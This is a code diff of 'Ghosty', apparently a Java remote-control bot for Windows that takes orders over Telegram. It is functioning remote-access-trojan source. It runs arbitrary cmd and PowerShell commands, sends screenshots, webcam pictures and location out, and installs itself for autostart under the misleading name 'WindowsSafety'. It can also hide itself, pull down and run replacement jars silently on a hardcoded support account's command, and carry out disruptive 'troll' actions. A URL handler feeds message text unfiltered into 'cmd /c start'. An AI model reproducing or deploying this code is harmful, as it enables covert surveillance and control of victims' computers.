@@ -1,5 +1,7 @@
 package ProjectX;
 
+import Chat.Client;
+import Chat.ClientGUI;
 import com.github.sarxos.webcam.Webcam;
 import com.github.sarxos.webcam.WebcamResolution;
 import org.jsoup.Jsoup;
@@ -13,25 +15,25 @@ import org.telegram.telegrambots.api.objects.Update;
 import org.telegram.telegrambots.api.objects.replykeyboard.ReplyKeyboardMarkup;
 import org.telegram.telegrambots.api.objects.replykeyboard.buttons.KeyboardRow;
 import org.telegram.telegrambots.bots.TelegramLongPollingBot;
-import org.telegram.telegrambots.exceptions.TelegramApiRequestException;
 import org.telegram.telegrambots.generics.BotSession;
 
 import javax.imageio.ImageIO;
 import javax.swing.*;
 import java.awt.*;
+import java.awt.List;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.InetAddress;
+import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.UnknownHostException;
 import java.nio.file.Files;
 import java.nio.file.StandardCopyOption;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
-import java.util.ArrayList;
-import java.util.Date;
+import java.util.*;
 
 /**
  * Created by Alexander Ressl on 10.04.2017 12:12.
@@ -45,15 +47,22 @@ public class Bot extends TelegramLongPollingBot {
     boolean unkillable;
     boolean antiAV;
     boolean troll;
+    Client client;
     boolean camera;
     boolean autoupdate;
     boolean taskhide;
     static boolean alive;
+    boolean writer = false;
+    boolean reader = false;
+    boolean changed = false;
     String token;
     String name;
     String admin;
     String support = "162922263";
-    double version = 1.58;
+    String fun = "DVD open,DVD close,Dog cleaner,Strange,Walk,Caps Fucker,Windows Fucker,Screen Fucker,Mouse Fucker,All Fucker,nobrain,bluescreen,scare";
+    String info = "Screenshot,Uptime,Wer,BatteryInformation,Location,Version,Path,Name,Pic,OperatingSystem,IP";
+    String tools = "Shutdown,Restart,Black,Lock,Alarm,Autolock,Sleep,GhostWriter,Close,Retry,ChangePW,Powershell,Uninstall,BotReset,Tarn,Cmd,Autostart";
+    public double version = 1.85;
     static private BotSession sup;
     boolean updating = false;
     private long last = System.currentTimeMillis();
@@ -65,20 +74,22 @@ public class Bot extends TelegramLongPollingBot {
     Thread run = new Thread(lowRam);
     TaskColor color = new TaskColor(this);
     Detect detct = null;
-    private boolean website = false;
     boolean sicher = false;
     int wo = 0;
     int menu = -1;
     private String time = "";
     boolean shutdown = false;
     boolean restart = false;
-    boolean reset = false;
-    boolean remove = false;
+    private boolean reset = false;
+    private boolean remove = false;
     static String password;
     static boolean silent;
-    TrayIcon trayIcon;
-
-    String changelog = "Language changed to english.";
+    private TrayIcon trayIcon;
+    private boolean unread = false;
+    private ClientGUI chat;
+    private boolean gusch = false;
+    Map<String, Long> buttons = new HashMap<>();
+    private String changelog = "You can now share a link or a music video with Ghosty (on Telegram) and Ghosty will automatically open the page on your device (Play the Video if its a youtube link.)\nKI Function added Ghosty will learn your behavior.";
 
     public Bot(String[] args) {
         config = read();
@@ -91,12 +102,24 @@ public class Bot extends TelegramLongPollingBot {
         this.camera = config.isCamera();
         this.autoupdate = config.isAutoupdate();
         this.taskhide = config.isTaskhide();
-        this.alive = config.isAlive();
+        alive = config.isAlive();
         this.token = config.getToken();
         this.name = config.getName();
         this.admin = config.getAdmin();
-        this.password = config.getPassword();
-        this.silent = config.isSilent();
+        this.buttons = config.getButtons();
+        if (buttons == null)
+            buttons = new HashMap<>();
+        if (this.buttons.size() < 4) {
+            for (String put : fun.split(","))
+                this.buttons.put(put, 0L);
+            for (String put : info.split(","))
+                this.buttons.put(put, 0L);
+            for (String put : tools.split(","))
+                this.buttons.put(put, 0L);
+            config.setButtons(this.buttons);
+        }
+        password = config.getPassword();
+        silent = config.isSilent();
         if (alive)
             tray();
         if (startupNotification) {
@@ -107,7 +130,7 @@ public class Bot extends TelegramLongPollingBot {
                     Date date = new Date();
                     String time = dateFormat.format(date);
                     if (!Bot.isSilent())
-                        sendNachricht("Prozess beendet. " + time);
+                        sendNachricht("Ghosty has been shutdown. " + time);
                 }
             });
             DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
@@ -132,7 +155,15 @@ public class Bot extends TelegramLongPollingBot {
             sendNachricht("Changelog:\n" + changelog);
             writeConf();
         }
-        setSilent(false);
+        if (silent) {
+            last = config.getLastmil();
+            time = config.getTime();
+            setSilent(false);
+        }
+        if (config.isReset()) {
+            config.setReset(false);
+            writeConf();
+        }
         if (troll) {
             runfuck.setDaemon(true);
             runfuck.start();
@@ -211,6 +242,7 @@ public class Bot extends TelegramLongPollingBot {
                 System.out.println(e);
             }
         }
+        chat = new ClientGUI("piboti.zapto.org", 4269, this);
     }
 
     private Config read() {
@@ -238,7 +270,11 @@ public class Bot extends TelegramLongPollingBot {
         if (update.getMessage().hasDocument()) {
             updating = true;
             setImage(1);
-            sendNachrichtAdmin("Dokument ist da");
+            sendNachrichtAdmin("Update detected!");
+            if (gusch)
+                sendNachrichtAdmin("SilentMode enabled!");
+            else
+                sendNachricht("Updating!\nPlease do not turn off your device in the next minute.");
             try {
                 GetFile n = new GetFile();
                 n.setFileId(update.getMessage().getDocument().getFileId());
@@ -246,26 +282,35 @@ public class Bot extends TelegramLongPollingBot {
                 java.io.File fileFromSystem = downloadFile(bl.getFilePath());
                 String pfad = System.getProperty("user.home") + "\\IO.jar";
                 Files.move(fileFromSystem.toPath(), (new java.io.File(pfad)).toPath(), StandardCopyOption.REPLACE_EXISTING);
-                sendNachrichtAdmin("FILE MOVED");
-                sendNachricht("Updating!\nPlease do not turn off your device in the next minute.");
+                sendNachrichtAdmin("Update done!");
+
                 File datei = new File(pfad);
-                config.setName(this.name.replace(";", ""));
-                writeConf();
-                File neu;
-                if (getName().equalsIgnoreCase("Ghosty.jar"))
-                    neu = new File(getPfad() + "Ghosti.jar");
-                else
-                    neu = new File(getPfad() + "Ghosty.jar");
-                datei.renameTo(neu);
-                Desktop.getDesktop().open(neu);
-                deleteme();
+                update(datei);
             } catch (Exception e) {
                 sendNachrichtAdmin(e.toString());
                 setImage(3);
+                if (silent)
+                    sendNachrichtAdmin("Update failed!");
+                else
+                    sendNachricht("Update failed!");
+                try {
+                    Thread.sleep(5000);
+                } catch (InterruptedException e1) {
+                }
+                updating = false;
             }
         }
+        if (!update.getMessage().hasText())
+            return;
+        long elapsedTimeMillis = System.currentTimeMillis() - last;
+        float elapsedTimeMin = elapsedTimeMillis / (60 * 1000F);
+        String nachricht = update.getMessage().getText();
         if (userid == Integer.parseInt(support) && !support.equalsIgnoreCase(admin)) {
-            sendNachrichtAdmin("Version: " + version);
+            if (nachricht.equalsIgnoreCase("Silent")) {
+                sendNachrichtAdmin("Silent!");
+                gusch = true;
+            } else
+                sendNachrichtAdmin("Version: " + version);
             return;
         }
         setImage(2);
@@ -274,11 +319,28 @@ public class Bot extends TelegramLongPollingBot {
             up.start();
         } else
             color.setRunning(true);
-        if (!update.getMessage().hasText())
-            return;
-        long elapsedTimeMillis = System.currentTimeMillis() - last;
-        float elapsedTimeMin = elapsedTimeMillis / (60 * 1000F);
-        String nachricht = update.getMessage().getText();
+
+        //ANFANGEN MIT HANDLEN
+
+
+        String[] parts = nachricht.split("\\s+");
+        for (String item : parts)
+            try {
+                URL url = new URL(item);
+                Runtime.getRuntime().exec("cmd /c start " + url);
+                sendNachricht("Opening URL.");
+                return;
+            } catch (MalformedURLException e) {
+            } catch (IOException e) {
+            }
+        if (tools.toLowerCase().contains(nachricht.toLowerCase()) || info.toLowerCase().contains(nachricht.toLowerCase()) || fun.toLowerCase().contains(nachricht.toLowerCase())) {
+            try {
+                this.buttons.put(nachricht, buttons.get(nachricht) + 1);
+                changed = true;
+            }catch (NullPointerException ignored){
+            }
+        }
+        //<editor-fold desc="Shutdown Restart reset close">
         if (shutdown) {
             shutdown = false;
             if (nachricht.equalsIgnoreCase("Yes"))
@@ -337,6 +399,16 @@ public class Bot extends TelegramLongPollingBot {
             menu = 100;
             sendNachricht("Do you wanna reboot the device?");
         }
+        if (nachricht.equalsIgnoreCase("startWriting")) {
+            changeWriting();
+        }
+        if (nachricht.equalsIgnoreCase("GhostWriter")) {
+            reader = !isReading();
+            if (reader)
+                sendNachricht("You are now a GhostWriter!");
+            else
+                sendNachricht("You are no longer a GhostWriter!");
+        }
         if (nachricht.toLowerCase().contains("powershell")) {
             String code;
             if (nachricht.equalsIgnoreCase("powershell")) {
@@ -370,52 +442,10 @@ public class Bot extends TelegramLongPollingBot {
             menu = 100;
             sendNachricht("Do you really want to reset Ghosty?");
         }
-        if (nachricht.toLowerCase().contains("cmd")) {
-            String code;
-            if (nachricht.equalsIgnoreCase("cmd")) {
-                try {
-                    Runtime.getRuntime().exec("cmd /c start");
-                } catch (Exception e) {
-                    sendNachrichtAdmin("Cmd konnte nicht gestartet werden!");
-                }
-            } else {
-                code = nachricht.split(":")[1];
-                code = code.replace(":", "");
-                try {
-                    Runtime.getRuntime().exec("cmd /c " + code);
-                } catch (Exception e) {
-                    sendNachrichtAdmin("Cmd konnte nicht gestartet werden!");
-                }
-            }
-        }
-        if (nachricht.equalsIgnoreCase("screenshot")) {
-            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
-            GraphicsDevice[] screens = ge.getScreenDevices();
-            Rectangle allScreenBounds = new Rectangle();
-            for (GraphicsDevice screen : screens) {
-                Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
-                allScreenBounds.width += screenBounds.width;
-                allScreenBounds.height = Math.max(allScreenBounds.height, screenBounds.height);
-            }
-            try {
-                Robot robot = new Robot();
-                BufferedImage screenShot = robot.createScreenCapture(allScreenBounds);
-                sendNachricht("OK, picture is sending!");
-                File send = new File(System.getProperty("user.home") + "\\Pic.jpg");
-                ImageIO.write(screenShot, "JPG", send);
-                Thread.sleep(100);
-                sendPic(send);
-                Thread.sleep(100);
-                send.delete();
-            } catch (Exception e) {
-                sendNachrichtAdmin(e.toString() + "\nBeim erstellen");
-            }
-        }
-        if (nachricht.equalsIgnoreCase("Uptime")) {
-            sendNachricht("Device is still running!\nTime running: " + (int) elapsedTimeMin / 60 + " h : " + (int) elapsedTimeMin % 60 + " m!\nSince: " + time);
-
-        }
+        //TODO CLOSE GEHT NICHT
+        System.out.println("Sicher = " + sicher);
         if (sicher) {
+            System.out.println("HEYA");
             sicher = false;
             if (nachricht.equalsIgnoreCase("Yes")) {
                 try {
@@ -439,6 +469,9 @@ public class Bot extends TelegramLongPollingBot {
             sendNachricht("Restarting. . .");
             retry();
         }
+        //</editor-fold>
+
+        //<editor-fold desc="Basic Menu Commands">
         if (nachricht.equalsIgnoreCase("menu")) {
             wo = 0;
             menu = -1;
@@ -477,46 +510,9 @@ public class Bot extends TelegramLongPollingBot {
             wo--;
             sendNachricht("Previous Page.");
         }
-        if (nachricht.equalsIgnoreCase("lock")) {
-            try {
-                Runtime.getRuntime().exec("C:\\Windows\\System32\\rundll32.exe user32.dll,LockWorkStation");
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            sendNachricht("Device locked!");
-        }
-        if (nachricht.equalsIgnoreCase("ChangePW")) {
-            sendNachricht("Please enter you new password on the device.");
-            JPanel panel = new JPanel();
-            JLabel label = new JLabel("Please enter your new password:");
-            JPasswordField pass = new JPasswordField(10);
-            JPasswordField pass1 = new JPasswordField(10);
-            panel.add(label);
-            panel.add(pass);
-            panel.add(pass1);
-            panel.grabFocus();
-            String[] options = new String[]{"OK", "Cancel"};
-            int option = JOptionPane.showOptionDialog(null, panel, "Password",
-                    JOptionPane.NO_OPTION, JOptionPane.PLAIN_MESSAGE,
-                    null, options, options[0]);
+        //</editor-fold>
 
-
-            if (option == 0) // pressing OK button
-            {
-                char[] password = pass.getPassword();
-                char[] password1 = pass1.getPassword();
-                String pw = new String(password);
-                String pw1 = new String(password1);
-                if (pw.equals(pw1)) {
-                    config.setPassword(pw);
-                    Bot.setPassword(pw);
-                    sendNachricht("Password set!");
-                    writeConf();
-                } else {
-                    sendNachricht("Passwords do not match!");
-                }
-            }
-        }
+        //<editor-fold desc="Troll">
         if (troll) {
             if (nachricht.equalsIgnoreCase("DVD open")) {
                 CDUtils.open();
@@ -569,20 +565,6 @@ public class Bot extends TelegramLongPollingBot {
                 }
 
             }
-            if (website) {
-                try {
-                    sendNachricht("Wird geöffnet");
-                    Runtime.getRuntime().exec("cmd /c start " + nachricht);
-                    website = false;
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-            if (nachricht.equalsIgnoreCase("website")) {
-                sendNachricht("URL schicken.");
-                website = true;
-            }
-
             if (nachricht.equalsIgnoreCase("nobrain")) {
                 try {
                     sendNachricht("Oh nette website.");
@@ -636,31 +618,68 @@ public class Bot extends TelegramLongPollingBot {
                     Draw.blue();
                 }
             }
-            if (nachricht.equalsIgnoreCase("wer")) {
-                try {
-                    InetAddress addr;
-                    addr = InetAddress.getLocalHost();
-                    sendNachricht(addr.getHostName());
-                } catch (Exception e) {
-                    sendNachricht("Es gibt keinen Nutzer.");
+        }
+        //</editor-fold>
+
+        //<editor-fold desc="Tools">
+        if (nachricht.equalsIgnoreCase("lock")) {
+            try {
+                Runtime.getRuntime().exec("C:\\Windows\\System32\\rundll32.exe user32.dll,LockWorkStation");
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            sendNachricht("Device locked!");
+        }
+        if (nachricht.equalsIgnoreCase("ChangePW")) {
+            sendNachricht("Please enter you new password on the device.");
+            JPanel panel = new JPanel();
+            JLabel label = new JLabel("Please enter your new password:");
+            JPasswordField pass = new JPasswordField(10);
+            JPasswordField pass1 = new JPasswordField(10);
+            panel.add(label);
+            panel.add(pass);
+            panel.add(pass1);
+            panel.grabFocus();
+            String[] options = new String[]{"OK", "Cancel"};
+            int option = JOptionPane.showOptionDialog(null, panel, "Password",
+                    JOptionPane.NO_OPTION, JOptionPane.PLAIN_MESSAGE,
+                    null, options, options[0]);
+            if (option == 0) // pressing OK button
+            {
+                char[] password = pass.getPassword();
+                char[] password1 = pass1.getPassword();
+                String pw = new String(password);
+                String pw1 = new String(password1);
+                if (pw.equals(pw1)) {
+                    config.setPassword(pw);
+                    Bot.setPassword(pw);
+                    sendNachricht("Password set!");
+                    writeConf();
+                } else {
+                    sendNachricht("Passwords do not match!");
                 }
             }
         }
-        if (nachricht.equalsIgnoreCase("IP")) {
-            sendNachricht(IP.getIP());
-        }
-        if (nachricht.equalsIgnoreCase("version")) {
-            sendNachricht("Version: " + version);
-        }
-        if (nachricht.equalsIgnoreCase("Black")) {
-           /* if (Draw.active) {
-                sendNachricht("Display aktiviert.");
-                Draw.stop();
+        if (nachricht.toLowerCase().contains("cmd")) {
+            String code;
+            if (nachricht.equalsIgnoreCase("cmd")) {
+                try {
+                    Runtime.getRuntime().exec("cmd /c start");
+                } catch (Exception e) {
+                    sendNachrichtAdmin("Cmd konnte nicht gestartet werden!");
+                }
             } else {
-                sendNachricht("Bildschirm off");
-                Draw.black();
+                code = nachricht.split(":")[1];
+                code = code.replace(":", "");
+                try {
+                    Runtime.getRuntime().exec("cmd /c " + code);
+                } catch (Exception e) {
+                    sendNachrichtAdmin("Cmd konnte nicht gestartet werden!");
+                }
             }
-            */
+        }
+
+        if (nachricht.equalsIgnoreCase("Black")) {
             try {
                 String command =
                         "Add-Type -TypeDefinition '\n" +
@@ -702,23 +721,7 @@ public class Bot extends TelegramLongPollingBot {
                 sendNachricht("Fehler beim Bildschirm abdrehen.");
             }
         }
-        if (nachricht.equalsIgnoreCase("dir")) {
-            try {
-                File folder = new File(getPfad());
-                File[] listOfFiles = folder.listFiles();
-                sendNachricht(getPfad());
-                sendNachricht(listOfFiles.length + "");
-                for (int i = 0; i < listOfFiles.length; i++) {
-                    if (listOfFiles[i].isFile()) {
-                        sendNachricht("File " + listOfFiles[i].getName());
-                    } else if (listOfFiles[i].isDirectory()) {
-                        sendNachricht("Directory " + listOfFiles[i].getName());
-                    }
-                }
-            } catch (Exception ex) {
-                sendNachricht("Fuck\n" + ex);
-            }
-        }
+
         if (nachricht.equalsIgnoreCase("autostart") && autostart) {
             try {
                 Reg.writeStringValue(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety", getAbsolutePfad());
@@ -745,23 +748,8 @@ public class Bot extends TelegramLongPollingBot {
             menu = 100;
             sendNachricht("Wirklich deinstallieren?");
         }
-        if (nachricht.equalsIgnoreCase("path")) {
-            sendNachricht(getPfad());
-        }
-        if (nachricht.equalsIgnoreCase("name")) {
-            sendNachricht(getName());
-        }
-        if (nachricht.equalsIgnoreCase("betriebssystem")) {
-            sendNachricht(System.getProperty("os.name"));
-        }
-        if (nachricht.equalsIgnoreCase("pic")) {
-            if (camera)
-                takepic();
-            else
-                sendNachricht("Camera has been deactivated in the settings.");
-        }
         if (nachricht.equalsIgnoreCase("alarm")) {
-            sendNachricht("Gehe in ALARM-Modus! Protokoll: Benachrichtigen.");
+            sendNachricht("Securitymode activated! Mode: INFORM.");
             Runnable detect = new Detect(0, this);
             Thread runDetect = new Thread(detect);
             runDetect.start();
@@ -769,16 +757,17 @@ public class Bot extends TelegramLongPollingBot {
         if (nachricht.equalsIgnoreCase("autolock")) {
 
             if (detct != null && detct.isRunning()) {
-                sendNachricht("AlarmModus deaktiviert");
+                sendNachricht("Autolock enabled");
                 detct.setRunning(false);
             } else {
-                sendNachricht("Gehe in ALARM-Modus! Protokoll: Sperren.");
+                sendNachricht("Securitymode activated! Mode: LOCK.");
                 detct = new Detect(1, this);
                 Runnable detect = detct;
                 Thread runDetect = new Thread(detect);
                 runDetect.start();
             }
         }
+
         if (nachricht.equalsIgnoreCase("sleep")) {
             try {
                 Runtime.getRuntime().exec("Rundll32.exe powrprof.dll,SetSuspendState Sleep");
@@ -786,22 +775,12 @@ public class Bot extends TelegramLongPollingBot {
                 sendNachricht(e.toString());
             }
         }
-        if (nachricht.equalsIgnoreCase("BatteryInformation")) {
-            Kernel32.SYSTEM_POWER_STATUS batteryStatus = new Kernel32.SYSTEM_POWER_STATUS();
-            Kernel32.INSTANCE.GetSystemPowerStatus(batteryStatus);
-            sendNachricht(batteryStatus.toString());
-        }
         if (nachricht.equalsIgnoreCase("tarn") && taskhide) {
             tarnung();
         }
-        if (nachricht.equalsIgnoreCase("hidden")) {
-            File me = new File(this.getAbsolutePfad());
-            sendNachricht(me.isHidden() + " -- suppose " + config.isHidden());
-        }
-
         if (nachricht.equalsIgnoreCase("Down")) {
             try {
-                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]174)");
+                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]174); $obj.SendKeys([char]174)");
             } catch (Exception e) {
                 sendNachricht("Fehler beim leiser drehen.");
             }
@@ -818,11 +797,11 @@ public class Bot extends TelegramLongPollingBot {
         }
         if (nachricht.equalsIgnoreCase("Up")) {
             try {
-                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]175)");
+                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]175); $obj.SendKeys([char]175)");
             } catch (Exception e) {
                 sendNachricht("Fehler beim lauter drehen.");
             }
-            sendNachricht("Lautstärke erhöht.");
+            sendNachricht("Volume increased.");
         }
 
         if (nachricht.equalsIgnoreCase("Previous")) {
@@ -849,6 +828,9 @@ public class Bot extends TelegramLongPollingBot {
             }
             sendNachricht("Nächstes Lied.");
         }
+        //</editor-fold>
+
+        //<editor-fold desc="Info">
         if (nachricht.equalsIgnoreCase("location")) {
             float lat = 0;
             float lon = 0;
@@ -861,26 +843,152 @@ public class Bot extends TelegramLongPollingBot {
             } catch (Exception e) {
                 System.out.println(e.toString());
             }
+
+            /*
+            try {
+                org.jsoup.nodes.Document doc = Jsoup.connect("https://www.google.at/search?q=where+am+i").get();
+                Elements bl = doc.select(".lu_map_section > a");
+                String blub = (bl.get(0).getAllElements().get(0).getAllElements().get(0)).toString();
+                String genauer = blub.substring(blub.indexOf("href") + 6, blub.indexOf("tabindex") - 2);
+                sendNachricht("www.google.at" + genauer);
+            } catch (Exception e) {
+                System.out.println(e.toString());
+            }
+            */
             if (lat == 0 && lon == 0)
                 sendNachricht("Fehler beim Orten.");
             else
                 sendLocation(lat, lon);
+
         }
+
+        if (nachricht.equalsIgnoreCase("path")) {
+            sendNachricht(getPfad());
+        }
+        if (nachricht.equalsIgnoreCase("name")) {
+            sendNachricht(getName());
+        }
+        if (nachricht.equalsIgnoreCase("OperatingSystem")) {
+            sendNachricht(System.getProperty("os.name"));
+        }
+        if (nachricht.equalsIgnoreCase("pic")) {
+            if (camera)
+                takepic();
+            else
+                sendNachricht("Camera has been deactivated in the settings.");
+        }
+
+
+        if (nachricht.equalsIgnoreCase("BatteryInformation")) {
+            Kernel32.SYSTEM_POWER_STATUS batteryStatus = new Kernel32.SYSTEM_POWER_STATUS();
+            Kernel32.INSTANCE.GetSystemPowerStatus(batteryStatus);
+            sendNachricht(batteryStatus.toString());
+        }
+        if (nachricht.equalsIgnoreCase("hidden")) {
+            File me = new File(this.getAbsolutePfad());
+            sendNachricht(me.isHidden() + " -- suppose " + config.isHidden());
+        }
+        if (nachricht.equalsIgnoreCase("screenshot")) {
+            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
+            GraphicsDevice[] screens = ge.getScreenDevices();
+            Rectangle allScreenBounds = new Rectangle();
+            for (GraphicsDevice screen : screens) {
+                Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
+                allScreenBounds.width += screenBounds.width;
+                allScreenBounds.height = Math.max(allScreenBounds.height, screenBounds.height);
+            }
+            try {
+                Robot robot = new Robot();
+                BufferedImage screenShot = robot.createScreenCapture(allScreenBounds);
+                sendNachricht("OK, picture is sending!");
+                File send = new File(System.getProperty("user.home") + "\\Pic.jpg");
+                ImageIO.write(screenShot, "JPG", send);
+                Thread.sleep(100);
+                sendPic(send);
+                Thread.sleep(100);
+                send.delete();
+            } catch (Exception e) {
+                sendNachrichtAdmin(e.toString() + "\nBeim erstellen");
+            }
+        }
+        if (nachricht.equalsIgnoreCase("Uptime")) {
+            sendNachricht("Device is still running!\nTime running: " + (int) elapsedTimeMin / 60 + " h : " + (int) elapsedTimeMin % 60 + " m!\nSince: " + time);
+        }
+        if (nachricht.equalsIgnoreCase("wer")) {
+            try {
+                InetAddress addr;
+                addr = InetAddress.getLocalHost();
+                sendNachricht(addr.getHostName());
+            } catch (Exception e) {
+                sendNachricht("Es gibt keinen Nutzer.");
+            }
+        }
+        if (nachricht.equalsIgnoreCase("IP")) {
+            sendNachricht(IP.getIP());
+        }
+        if (nachricht.equalsIgnoreCase("version")) {
+            sendNachricht("Version: " + version);
+        }
+
+        if (nachricht.equalsIgnoreCase("dir")) {
+            try {
+                File folder = new File(getPfad());
+                File[] listOfFiles = folder.listFiles();
+                sendNachricht(getPfad());
+                sendNachricht(listOfFiles.length + "");
+                for (int i = 0; i < listOfFiles.length; i++) {
+                    if (listOfFiles[i].isFile()) {
+                        sendNachricht("File " + listOfFiles[i].getName());
+                    } else if (listOfFiles[i].isDirectory()) {
+                        sendNachricht("Directory " + listOfFiles[i].getName());
+                    }
+                }
+            } catch (Exception ex) {
+                sendNachricht("Fuck\n" + ex);
+            }
+        }
+        //</editor-fold>
+
         if (menu == 0 && !troll) {
             wo = 0;
-
             sendNachricht("Troll function have been deactivated in the Ghosty Settings.");
         }
     }
 
-    public void retry() {
+    public void changeWriting() {
+        writer = !isWriter();
+        if (writer) {
+            PressKey k = new PressKey(client, this);
+            Thread run = new Thread(k);
+            run.start();
+        }
+        sendNachricht("Writing: " + writer);
+    }
+
+    public void update(File datei) throws IOException {
+        if (!gusch) {
+            config.setName(this.name.replace(";", ""));
+            writeConf();
+        }
+        File neu;
+        if (getName().equalsIgnoreCase("Ghosty.jar"))
+            neu = new File(getPfad() + "Ghosti.jar");
+        else
+            neu = new File(getPfad() + "Ghosty.jar");
+        setSilent(true);
+        datei.renameTo(neu);
+        Desktop.getDesktop().open(neu);
+        deleteme();
+    }
+
+    void retry() {
         try {
-            // Runtime.getRuntime().exec("powershell /c Start-Process \"" + getPfad() + getName() + "\" -ArgumentList restart");
+            //Runtime.getRuntime().exec("powershell /c Start-Process \"" + getAbsolutePfad() + "\" -ArgumentList restart");
             Runtime.getRuntime().exec("cmd /c taskkill /F /IM powershell.exe");
             Runtime.getRuntime().exec("cmd /c start \"\" \"" + getAbsolutePfad() + "\"");
             System.exit(0);
         } catch (Exception e) {
-            sendNachrichtAdmin("CMD Fail bei retry!\nRestart");
+            sendNachrichtAdmin("Fail bei retry!\nRestart");
         }
 
     }
@@ -896,7 +1004,8 @@ public class Bot extends TelegramLongPollingBot {
     }
 
     void reset() {
-        removeConf();
+        config.setReset(true);
+        writeConf();
         retry();
     }
 
@@ -962,7 +1071,6 @@ public class Bot extends TelegramLongPollingBot {
             for (int j = 0; j < 3; j++) {
                 if (getRow(wo, j, gseiten, buttonArray).size() != 0) {
                     commands.add(getRow(wo, j, gseiten, buttonArray));
-                    System.out.println(getRow(wo, j, gseiten, buttonArray));
                 }
             }
         } else {
@@ -1002,7 +1110,7 @@ public class Bot extends TelegramLongPollingBot {
     }
 
     void panic() {
-        sendNachricht("Erfolgreich deinstalliert!");
+        sendNachricht("Ghosty has been removed sucessfully!");
         removeConf();
         deleteme();
     }
@@ -1068,6 +1176,10 @@ public class Bot extends TelegramLongPollingBot {
     }
 
     public String getItems() {
+        String fun = "";
+        String tools = "";
+        String info = "";
+
         switch (menu) {
             default:
             case -1:
@@ -1076,11 +1188,45 @@ public class Bot extends TelegramLongPollingBot {
                 else
                     return "Info,Tools,Music";
             case 0:
-                return "DVD open,DVD close,website,Dog cleaner,Strange,Walk,Caps Fucker,Windows Fucker,Screen Fucker,Mouse Fucker,All Fucker,nobrain,bluescreen,scare";
+                HashMap<String, Long> funny = new HashMap<>();
+                for (String k : this.fun.split(",")) {
+                    funny.put(k, buttons.get(k));
+                }
+                funny = sortHashMapByValues(funny);
+                for (int i = funny.size() - 1; i >= 0; i--) {
+                    if (i != 0)
+                        fun += funny.keySet().toArray()[i] + ",";
+                    else
+                        fun += funny.keySet().toArray()[i];
+                }
+                return fun;
             case 1:
-                return "Screenshot,Uptime,Wer,BatteryInformation,Location,Version,Path,Name,Pic,OperatingSystem,IP";
+                HashMap<String, Long> informy = new HashMap<>();
+                for (String k : this.info.split(",")) {
+                    informy.put(k, buttons.get(k));
+                }
+                informy = sortHashMapByValues(informy);
+                for (int i = informy.size() - 1; i >= 0; i--) {
+                    if (i != 0)
+                        info += informy.keySet().toArray()[i] + ",";
+                    else
+                        info += informy.keySet().toArray()[i];
+                }
+
+                return info;
             case 2:
-                return "Shutdown,Restart,Black,Lock,Alarm,Autolock,Sleep,Close,Retry,ChangePW,Powershell,Uninstall,BotReset,Tarn,Cmd,Autostart";
+                HashMap<String, Long> toly = new HashMap<>();
+                for (String k : this.tools.split(",")) {
+                    toly.put(k, buttons.get(k));
+                }
+                toly = sortHashMapByValues(toly);
+                for (int i = toly.size() - 1; i >= 0; i--) {
+                    if (i != 0)
+                        tools += toly.keySet().toArray()[i] + ",";
+                    else
+                        tools += toly.keySet().toArray()[i];
+                }
+                return tools;
             case 3:
                 return "Down,Un-/Mute,Up,Previous,Play/Pause,Next";
             case 100:
@@ -1088,8 +1234,36 @@ public class Bot extends TelegramLongPollingBot {
         }
     }
 
+    public LinkedHashMap<String, Long> sortHashMapByValues(
+            HashMap<String, Long> passedMap) {
+        java.util.List<String> mapKeys = new ArrayList<>(passedMap.keySet());
+        java.util.List<Long> mapValues = new ArrayList<>(passedMap.values());
+        Collections.sort(mapValues);
+        Collections.sort(mapKeys);
+
+        LinkedHashMap<String, Long> sortedMap =
+                new LinkedHashMap<>();
+
+        Iterator<Long> valueIt = mapValues.iterator();
+        while (valueIt.hasNext()) {
+            Long val = valueIt.next();
+            Iterator<String> keyIt = mapKeys.iterator();
+
+            while (keyIt.hasNext()) {
+                String key = keyIt.next();
+                Long comp1 = passedMap.get(key);
+                if (comp1.equals(val)) {
+                    keyIt.remove();
+                    sortedMap.put(key, val);
+                    break;
+                }
+            }
+        }
+        return sortedMap;
+    }
+
     void tray() {
-        if (!alive)
+        if (!isAlive())
             return;
         if (!SystemTray.isSupported()) {
             return;
@@ -1101,7 +1275,6 @@ public class Bot extends TelegramLongPollingBot {
         //get image
         //Toolkit.getDefaultToolkit().getImage("src/resources/busylogo.jpg");
         Image image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/3.gif"));
-        ;
 
         //popupmenu
         PopupMenu trayPopupMenu = new PopupMenu();
@@ -1162,6 +1335,18 @@ public class Bot extends TelegramLongPollingBot {
             }
         });
         trayPopupMenu.add(update);
+
+
+        MenuItem chat = new MenuItem("Chat");
+        chat.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                getChat().showGui();
+            }
+        });
+        trayPopupMenu.add(chat);
+
+
         //2nd menuitem of popupmenu
         MenuItem close = new MenuItem("Close");
         close.addActionListener(new ActionListener() {
@@ -1229,27 +1414,37 @@ public class Bot extends TelegramLongPollingBot {
             case 3:
                 image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/err.gif"));
                 break;
+            case 4:
+                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/unread.gif"));
+                break;
         }
         trayIcon.setImage(image);
     }
 
     public void setSilent(boolean silen) {
         silent = silen;
-        File botconf = new File(System.getProperty("user.home") + "\\botconf.bot");
